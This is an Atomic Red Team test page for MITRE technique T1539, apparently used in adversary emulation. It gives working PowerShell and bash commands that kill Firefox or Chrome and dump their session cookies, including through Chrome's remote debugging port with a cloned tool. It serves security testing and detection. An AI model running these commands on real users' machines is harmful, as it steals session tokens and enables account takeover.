---
tags: [T1539, atomic_test]
filename: "[[T1539 - Steal Web Session Cookie]]"
---
# T1539 - Steal Web Session Cookie

## Atomic Test #1 - Steal Firefox Cookies (Windows)
This test queries Firefox's cookies.sqlite database to steal the cookie data contained within it, similar to Zloader/Zbot's cookie theft function. 
Note: If Firefox is running, the process will be killed to ensure that the DB file isn't locked. 
See https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.

**Supported Platforms:** Windows


**auto_generated_guid:** 4b437357-f4e9-4c84-9fa6-9bcee6f826aa





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| sqlite3_path | Path to sqlite3 | path | PathToAtomicsFolder&#92;..&#92;ExternalPayloads&#92;sqlite-tools-win32-x86-3380200&#92;sqlite3.exe|
| output_file | Filepath to output cookies | path | PathToAtomicsFolder&#92;..&#92;ExternalPayloads&#92;T1539FirefoxCookies.txt|


#### Attack Commands: Run with `powershell`! 


```powershell
stop-process -name "firefox" -force -erroraction silentlycontinue
$CookieDBLocation = get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*\cookies.sqlite"
"select host, name, value, path, expiry, isSecure, isHttpOnly, sameSite from [moz_cookies];" | cmd /c #{sqlite3_path} "$CookieDBLocation" | out-file -filepath "#{output_file}"
```

#### Cleanup Commands:
```powershell
remove-item #{output_file} -erroraction silentlycontinue
```



#### Dependencies:  Run with `powershell`!
##### Description: Sqlite3 must exist at (#{sqlite3_path})
##### Check Prereq Commands:
```powershell
if (Test-Path "#{sqlite3_path}") {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -force
```




<br/>
<br/>

## Atomic Test #2 - Steal Chrome Cookies (Windows)
This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. 
Once an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. 
Note: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. 
See https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.

**Supported Platforms:** Windows


**auto_generated_guid:** 26a6b840-4943-4965-8df5-ef1f9a282440





#### Inputs:
| Name | Description | Type | Default Value |
|------|-------------|------|---------------|
| cookie_db | Filepath for Chrome cookies database | string | $env:localappdata&#92;Google&#92;Chrome&#92;User Data&#92;Default&#92;Network&#92;Cookies|
| sqlite3_path | Path to sqlite3 | path | PathToAtomicsFolder&#92;..&#92;ExternalPayloads&#92;sqlite-tools-win32-x86-3380200&#92;sqlite3.exe|
| output_file | Filepath to output cookies | path | PathToAtomicsFolder&#92;..&#92;ExternalPayloads&#92;T1539ChromeCookies.txt|


#### Attack Commands: Run with `powershell`! 


```powershell
stop-process -name "chrome" -force -erroraction silentlycontinue
"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c #{sqlite3_path} "#{cookie_db}" | out-file -filepath "#{output_file}"
```

#### Cleanup Commands:
```powershell
remove-item #{output_file}
```



#### Dependencies:  Run with `powershell`!
##### Description: Sqlite3 must exist at (#{sqlite3_path})
##### Check Prereq Commands:
```powershell
if (Test-Path "#{sqlite3_path}") {exit 0} else {exit 1}
```
##### Get Prereq Commands:
```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -force
```




<br/>
<br/>

## Atomic Test #3 - Steal Chrome Cookies via Remote Debugging (Mac)
The remote debugging functionality in Chrome can be used by malware for post-exploitation activities to obtain cookies without requiring keychain access. By initiating Chrome with a remote debug port, an attacker can sidestep encryption and employ Chrome's own mechanisms to access cookies.

If successful, this test will output a list of cookies.

Note: Chrome processes will be killed during this test.

See https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e

**Supported Platforms:** macOS


**auto_generated_guid:** e43cfdaf-3fb8-4a45-8de0-7eee8741d072






#### Attack Commands: Run with `bash`! 


```bash
killall 'Google Chrome'
sleep 1
open -a "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" --args --remote-debugging-port=1337 --remote-allow-origins=http://localhost/
sleep 1
/tmp/WhiteChocolateMacademiaNut/chocolate -d cookies -p 1337
```

#### Cleanup Commands:
```bash
rm -rf /tmp/WhiteChocolateMacademiaNut
```



#### Dependencies:  Run with `bash`!
##### Description: Install Go
##### Check Prereq Commands:
```bash
go version
```
##### Get Prereq Commands:
```bash
brew install go
```
##### Description: Download and compile WhiteChocolateMacademiaNut
##### Check Prereq Commands:
```bash
/tmp/WhiteChocolateMacademiaNut/chocolate -h
```
##### Get Prereq Commands:
```bash
git clone https://github.com/slyd0g/WhiteChocolateMacademiaNut.git /tmp/WhiteChocolateMacademiaNut
cd /tmp/WhiteChocolateMacademiaNut
go mod init chocolate
go mod tidy
go build
```




<br/>
